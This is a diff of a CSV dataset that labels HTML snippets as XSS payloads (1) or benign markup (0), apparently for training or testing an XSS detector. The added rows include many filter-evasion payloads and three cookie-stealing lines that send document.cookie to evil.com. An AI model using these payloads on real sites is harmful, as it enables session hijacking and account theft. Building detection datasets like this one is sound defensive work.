@@ -1,41 +1,115 @@
-payload,label
-"<script>alert(1)</script>",1
-"<img src=x onerror=alert(1)>",1
-"<a href=""javascript:alert(1)"">Click here</a>",1
-"<svg onload=alert(1)>",1
-"<iframe src=""javascript:alert(1)""></iframe>",1
-"<body onload=alert(1)>",1
-"<math><maction actiontype=""statusline#http://google.com"" xlink:href=""javascript:alert(1)"">CLICKME</maction></math>",1
-"<object data=""data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==""></object>",1
-"<embed src=""data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==""></embed>",1
-"<script>eval(atob(""YWxlcnQoMSk=""))</script>",1
-"<img src=""data:image/png;base64,iVBORw0KGgo="" onload=""alert(1)"">",1
-"<link rel=""stylesheet"" href=""javascript:alert(1)"">",1
-"<meta http-equiv=""refresh"" content=""0;url=javascript:alert(1)"">",1
-"<base href=""javascript:alert(1)//"">",1
-"<form action=""javascript:alert(1)""><input type=submit></form>",1
-"<button formaction=""javascript:alert(1)"">X</button>",1
-"<input type=""image"" src=""x"" onerror=""alert(1)"">",1
-"<video poster=""javascript:alert(1)""></video>",1
-"<audio src=""x"" onerror=""alert(1)""></audio>",1
-"<source src=""javascript:alert(1)"">",1
-"<div>Hello World</div>",0
-"<p>This is a benign string.</p>",0
-"<img src=""logo.png"" alt=""Logo"">",0
-"<a href=""https://google.com"">Google</a>",0
-"<span class=""text-bold"">Bold Text</span>",0
-"<ul><li>Item 1</li><li>Item 2</li></ul>",0
-"<button type=""button"" class=""btn"">Submit</button>",0
-"<form action=""/login"" method=""POST""><input type=""text"" name=""user""></form>",0
-"<iframe src=""https://youtube.com/embed/123""></iframe>",0
-"<link rel=""stylesheet"" href=""/style.css"">",0
-"<meta name=""description"" content=""A web page"">",0
-"<script src=""/app.js""></script>",0
-"<h1>Welcome to our site</h1>",0
-"<nav><ul><li>Home</li></ul></nav>",0
-"<div id=""app"" data-v=""123""></div>",0
-"<input type=""password"" placeholder=""Password"">",0
-"<svg viewBox=""0 0 100 100""><circle cx=""50"" cy=""50"" r=""40"" /></svg>",0
-"<video src=""movie.mp4"" controls></video>",0
-"<audio src=""song.mp3"" controls></audio>",0
-"<a href=""mailto:test@example.com"">Email us</a>",0
+"payload","label"
+"<script>alert(1)</script>","1"
+"<img src=x onerror=alert(1)>","1"
+"<a href=""javascript:alert(1)"">Click here</a>","1"
+"<svg onload=alert(1)>","1"
+"<iframe src=""javascript:alert(1)""></iframe>","1"
+"<body onload=alert(1)>","1"
+"<math><maction actiontype=""statusline#http://google.com"" xlink:href=""javascript:alert(1)"">CLICKME</maction></math>","1"
+"<object data=""data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==""></object>","1"
+"<embed src=""data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==""></embed>","1"
+"<script>eval(atob(""YWxlcnQoMSk=""))</script>","1"
+"<img src=""data:image/png;base64,iVBORw0KGgo="" onload=""alert(1)"">","1"
+"<link rel=""stylesheet"" href=""javascript:alert(1)"">","1"
+"<meta http-equiv=""refresh"" content=""0;url=javascript:alert(1)"">","1"
+"<base href=""javascript:alert(1)//"">","1"
+"<form action=""javascript:alert(1)""><input type=submit></form>","1"
+"<button formaction=""javascript:alert(1)"">X</button>","1"
+"<input type=""image"" src=""x"" onerror=""alert(1)"">","1"
+"<video poster=""javascript:alert(1)""></video>","1"
+"<audio src=""x"" onerror=""alert(1)""></audio>","1"
+"<source src=""javascript:alert(1)"">","1"
+"<script>document.cookie</script>","1"
+"<script>window.location='http://evil.com/?c='+document.cookie</script>","1"
+"<img src=1 onerror=""this.src='http://evil.com/'+document.cookie"">","1"
+"<body onload=""document.location='http://evil.com/'+document.cookie"">","1"
+"<details open ontoggle=alert(1)>","1"
+"<marquee onstart=alert(1)>","1"
+"<input autofocus onfocus=alert(1)>","1"
+"<select autofocus onfocus=alert(1)>","1"
+"<textarea autofocus onfocus=alert(1)>","1"
+"<keygen autofocus onfocus=alert(1)>","1"
+"<video><source onerror=""javascript:alert(1)"">","1"
+"<audio src=x onerror=alert(1)>","1"
+"<object type=""text/html"" data=""javascript:alert(1)"">","1"
+"<embed src=""data:text/html,<script>alert(1)<\/script>"">","1"
+"<svg><script>alert(1)</script></svg>","1"
+"<math><script>alert(1)</script></math>","1"
+"<svg onload=alert(1)>","1"
+"<svg><animate onbegin=alert(1) attributeName=x dur=1s>","1"
+"<svg><set onbegin=alert(1) attributeName=x>","1"
+"<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>","1"
+"<script>window['alert'](1)</script>","1"
+"<script>top['alert'](1)</script>","1"
+"<script>self['alert'](1)</script>","1"
+"<script src=""data:,alert(1)""></script>","1"
+"<script>setTimeout('alert(1)',0)</script>","1"
+"<script>setInterval('alert(1)',9999)</script>","1"
+"<a href=""&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)"">click</a>","1"
+"<a href=""jAvAsCrIpT:alert(1)"">click</a>","1"
+"<a href=""javascript&#58;alert(1)"">XSS</a>","1"
+"<a href=""  javascript:alert(1)"">XSS</a>","1"
+"<img src=`x`onerror=alert(1)>","1"
+"<img src='x' onerror='alert(1)'>","1"
+"<img/src=x onerror=alert(1)>","1"
+"<img src=x onerror=alert(String.fromCharCode(88,83,83))>","1"
+"<link rel=import href=""data:text/html,<script>alert(1)<\/script>"">","1"
+"<meta http-equiv=""refresh"" content=""0; url=javascript:alert(1)"">","1"
+"<base href=""javascript:alert(1)//"">","1"
+"<form><button formaction=""javascript:alert(1)"">X</button></form>","1"
+"<isindex type=image src=1 onerror=alert(1)>","1"
+"<table background=""javascript:alert(1)""></table>","1"
+"<script>/*</script><script>*/alert(1)</script>","1"
+"<script>\u0061lert(1)</script>","1"
+"<script>a\u006cert(1)</script>","1"
+"<script>al\u0065rt(1)</script>","1"
+"<div>Hello World</div>","0"
+"<p>This is a benign string.</p>","0"
+"<img src=""logo.png"" alt=""Logo"">","0"
+"<a href=""https://google.com"">Google</a>","0"
+"<span class=""text-bold"">Bold Text</span>","0"
+"<ul><li>Item 1</li><li>Item 2</li></ul>","0"
+"<button type=""button"" class=""btn"">Submit</button>","0"
+"<form action=""/login"" method=""POST""><input type=""text"" name=""user""></form>","0"
+"<iframe src=""https://youtube.com/embed/123""></iframe>","0"
+"<link rel=""stylesheet"" href=""/style.css"">","0"
+"<meta name=""description"" content=""A web page"">","0"
+"<script src=""/app.js""></script>","0"
+"<h1>Welcome to our site</h1>","0"
+"<nav><ul><li>Home</li></ul></nav>","0"
+"<div id=""app"" data-v=""123""></div>","0"
+"<input type=""password"" placeholder=""Password"">","0"
+"<svg viewBox=""0 0 100 100""><circle cx=""50"" cy=""50"" r=""40"" /></svg>","0"
+"<video src=""movie.mp4"" controls></video>","0"
+"<audio src=""song.mp3"" controls></audio>","0"
+"<a href=""mailto:test@example.com"">Email us</a>","0"
+"<div class=""container""><p>Welcome!</p></div>","0"
+"<header><nav><ul><li><a href=""/home"">Home</a></li></ul></nav></header>","0"
+"<footer><p>&copy; 2026 Example Corp</p></footer>","0"
+"<table><thead><tr><th>Name</th><th>Age</th></tr></thead><tbody><tr><td>Alice</td><td>30</td></tr></tbody></table>","0"
+"<form action=""/submit"" method=""POST""><input type=""text"" name=""name"" placeholder=""Your name""><button type=""submit"">Submit</button></form>","0"
+"<img src=""https://example.com/photo.jpg"" alt=""A photo"" width=""300"">","0"
+"<video src=""https://example.com/video.mp4"" controls width=""640""></video>","0"
+"<audio src=""https://example.com/audio.mp3"" controls></audio>","0"
+"<iframe src=""https://www.youtube.com/embed/dQw4w9WgXcQ"" frameborder=""0""></iframe>","0"
+"<link rel=""stylesheet"" href=""https://cdn.example.com/style.css"">","0"
+"<script src=""https://cdn.example.com/app.js""></script>","0"
+"<meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">","0"
+"<input type=""email"" name=""email"" placeholder=""email@example.com"" required>","0"
+"<select name=""country""><option value=""us"">United States</option><option value=""in"">India</option></select>","0"
+"<textarea name=""message"" rows=""4"" cols=""50"">Type your message here</textarea>","0"
+"<label for=""name"">Full Name:</label><input id=""name"" type=""text"" name=""name"">","0"
+"<svg viewBox=""0 0 100 100"" xmlns=""http://www.w3.org/2000/svg""><circle cx=""50"" cy=""50"" r=""40"" fill=""blue""/></svg>","0"
+"<canvas id=""myCanvas"" width=""200"" height=""100""></canvas>","0"
+"<details><summary>More info</summary><p>Here is the additional information.</p></details>","0"
+"<blockquote cite=""https://example.com""><p>This is a quote.</p></blockquote>","0"
+"<figure><img src=""diagram.png"" alt=""Architecture diagram""><figcaption>Figure 1: System Overview</figcaption></figure>","0"
+"<article><h2>Blog Post Title</h2><p>Post content goes here.</p></article>","0"
+"<section id=""about""><h2>About Us</h2><p>We build great software.</p></section>","0"
+"<aside><h3>Related Articles</h3><ul><li>Article 1</li><li>Article 2</li></ul></aside>","0"
+"<button type=""button"" class=""btn btn-primary"" id=""submitBtn"">Save Changes</button>","0"
+"<div data-component=""carousel"" data-interval=""3000"" class=""carousel""></div>","0"
+"<template id=""row-template""><tr><td class=""name""></td><td class=""value""></td></tr></template>","0"
+"<slot name=""content""><p>Default content</p></slot>","0"
+"<picture><source media=""(max-width: 640px)"" srcset=""small.jpg""><img src=""large.jpg"" alt=""Responsive image""></picture>","0"
+"<object data=""document.pdf"" type=""application/pdf"" width=""600"" height=""400""></object>","0"
